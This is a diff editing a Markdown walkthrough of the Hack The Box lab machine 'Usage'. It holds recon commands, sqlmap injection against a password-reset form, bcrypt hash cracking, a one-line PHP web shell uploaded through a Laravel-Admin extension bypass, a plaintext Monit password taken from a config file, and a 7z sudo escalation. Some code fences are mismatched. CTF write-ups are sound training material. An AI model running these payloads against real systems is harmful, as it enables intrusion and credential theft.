@@ -24,14 +24,19 @@
 ---
 
 ## Recon 🔍
+
+#### Find live ports
 ```bash
-# Find live ports
 nmap -p- --min-rate 10000 10.10.11.18
+```
 
-# Service/version detection
+#### Service/version detection
+```bash
 nmap -p 22,80 -sCV 10.10.11.18
+```
 
-# Virtual‑host discovery
+#### Virtual‑host discovery
+```bash
 ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
      -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
 ````
@@ -41,39 +46,53 @@ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
 ## Shell as dash 🐚
 
 1. **Confirm blind [SQL Injection](SQL Injection)**
-    
-    ```bash
-    # Test on password reset
-    curl -X POST 'http://usage.htb/forgot-password' \
-         -d "email=' or 1=1-- -"
+
+```bash
+curl -X POST 'http://usage.htb/forgot-password' -H "Content-Type: application/x-www-form-urlencoded" -d "email=' or 1=1-- -" --trace-ascii reset.request
+```
+
+```bash
+curl -X POST 'http://usage.htb/forgot-password' -d "email=' or 1=1-- -" > reset.request
     ```
     
 2. **Dump database with sqlmap**
     
-    ```bash
-    sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
-    sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch \
-           -D usage_blog --tables
-    sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch \
-           -D usage_blog -T admin_users --dump
+```bash
+sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
     ```
+    
+```bash
+    sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog --tables    
+```
+
+```bash
+sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog -T admin_users --dump
+```
     
 3. **Crack the admin hash**
     
-    ```bash
-    echo "$HASH" > admin.hash
-    hashcat -m 3200 admin.hash rockyou.txt
-    ```
+```bash
+echo "$HASH" > admin.hash
+```
     
+```
+hashcat -m 3200 admin.hash rockyou.txt
+```
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+
 4. **Bypass file‑extension in Laravel‑Admin**
     
     - Upload `0xdf.php.jpg`, intercept in **Burp**, rename to `.php`
         
     - Access shell:
         
-        ```
-        http://admin.usage.htb/uploads/images/0xdf.php?cmd=id
-        ```
+```
+http://admin.usage.htb/uploads/images/0xdf.php?cmd=id
+```
         
 5. **Get reverse shell**
     
@@ -89,10 +108,10 @@ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
 
 1. **Grab Monit creds** from dash’s home:
     
-    ```bash
-    grep -R "allow admin" /home/dash/.monitrc
-    # → 3nc0d3d_pa$$w0rd
-    ```
+```bash
+grep -R "allow admin" /home/dash/.monitrc
+# → 3nc0d3d_pa$$w0rd
+```
     
 2. **Switch user**:
     
@@ -132,13 +151,9 @@ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
 ## Actions Learned 🎓
 
 - Mastered blind [SQL Injection](SQL Injection) with **sqlmap**
-    
 - Bypassed extension checks in **Laravel‑Admin** for RCE
-    
 - Extracted service creds from **monit** config
-    
 - Leveraged wildcard expansion in **7z** via NOPASSWD sudo to leak files
-    
 - Chained full path: Recon → User (dash) → Admin (xander) → Root
     
 
@@ -147,7 +162,9 @@ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
 ## References 🔗
 
 - CVE-2023-24249 – Laravel‑Admin file upload extension bypass
-    
 - HackTricks: 7‑Zip wildcard symlink attack
-    
 - [Laravel‑Admin GitHub](https://github.com/laravel-admin-extensions/laravel-admin)
+
+https://www.youtube.com/watch?v=cx9Da-PoXG4
+
+https://0xdf.gitlab.io/2024/08/10/htb-usage.html
